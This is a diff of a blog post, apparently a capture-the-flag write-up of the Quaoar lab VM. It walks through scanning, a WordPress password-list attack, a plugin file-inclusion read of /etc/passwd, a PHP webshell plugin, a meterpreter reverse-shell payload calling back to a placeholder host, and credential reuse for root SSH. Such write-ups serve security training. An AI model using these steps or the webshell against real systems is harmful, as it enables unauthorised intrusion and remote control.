@@ -1,10 +1,11 @@
 ---
 layout: post
-title: hackfest2016: Quaroar
+title: hackfest2016-Quaroar
 slug: hackfest-2016-quaroar
-name: hackfest2016: Quaroar
+name: hackfest2016-Quaroar
 ---
 
+{% highlight bash %}
 root@425a6cebc5e3:/# nmap -T4 -A -sC -v -P 0-65535 192.168.171.128 -oA quaoar
 Warning: The -P0 option is deprecated. Please use -Pn
 
@@ -159,8 +160,22 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
 Raw packets sent: 1066 (50.324KB) | Rcvd: 1034 (42.024KB)
 
+{% endhighlight %}
 
-# Wordpress
+## dirbuster
+
+The VM mentions using dirbuster, so I fired that up with the default wordlists and let it go.
+
+Looks like there are 2 web apps running:
+
+> Wordpress -- /wordpress
+> Lepton CMS 2 -- /upload 
+
+## Lepton CMS
+
+I tried lepton first and it seemed like it wasn't exactly working, possibly my VM setup.
+
+## Wordpress
 
 wpscan --url 10.37.129.6/wordpress --wordlist /usr/share/wordlists/wfuzz/others/common_pass.txt -e --random-agent --proxy 192.168.0.9:8080
 _______________________________________________________________
@@ -387,8 +402,9 @@ _______________________________________________________________
 [+] Memory used: 168.398 MB
 [+] Elapsed time: 00:00:52
 
+
 Try logging in as admin:admin, works
-    
+
 
 curl -v http://10.37.129.6/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 *   Trying 10.37.129.6...
@@ -446,4 +462,78 @@ postgres:x:115:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 tomcat6:x:116:126::/usr/share/tomcat6:/bin/false
 wpadmin:x:1001:1001::/home/wpadmin:/bin/sh
 
+Still no way to get a password.
 
+Next I realized as an administrator I can install plugins.  So I made a simple webshell:
+
+{% highlight php %}
+<?php
+/*
+ * Plugin Name: backdoor
+ * Plugin URI: https://www.com
+ * Description: backdoor
+ * Version: 1.0.0
+ * Author: backdoor
+ * Author URI: http://www.com
+ * Text Domain: backdoor
+ * Domain Path: /languages
+ * */
+
+echo system($_GET["cmd"]); 
+?>
+{% endhighlight %}
+
+Once actived I was able to execute code. Now for a meterpreter payload and serve it up with SimpleHTTPServer
+
+{% highlight bash %}
+msfvenom -p php/meterpreter/reverse_tcp LPORT=111.111.111.111 LPORT=444 R > backdoor.php
+pythom -m SimpleHTTPServer
+{% endhighlight %}
+
+Then I can use my plugin to get the payload onto the web server and start metasploit:
+
+{% highlight bash %}
+msfconsole
+use exploit/multi/handler
+set LHOST 111.111.111.111
+set LPORT 4444
+set payload php/meterpreter/reverse_tcp
+exploit
+{% endhighlight %}
+
+Now that the meterpreter handler is running I can fire up the shell and now we have the first flag.
+
+## PrivEsc
+
+Now that I have shell:
+
+{% highlight bash %}
+cd ../../../../
+pwd
+/var/www/wordpress
+{% endhighlight %}
+
+Now that we are in the Wordpress root let's look at the config file and see what the database credentials are:
+
+{% highlight bash %}
+cat wp-config.php
+{% endhighlight %}
+
+{% highlight php %}
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'rootpassword!');
+{% endhighlight %}
+
+Now to test: 
+
+{% highlight bash %}
+ssh root@vm
+pass: rootpassword!
+{% endhighlight %}
+
+And we're in, do a quick ls and see the flag:
+
+8e3f9ec016e3598c5eec11fd3d73f6fb
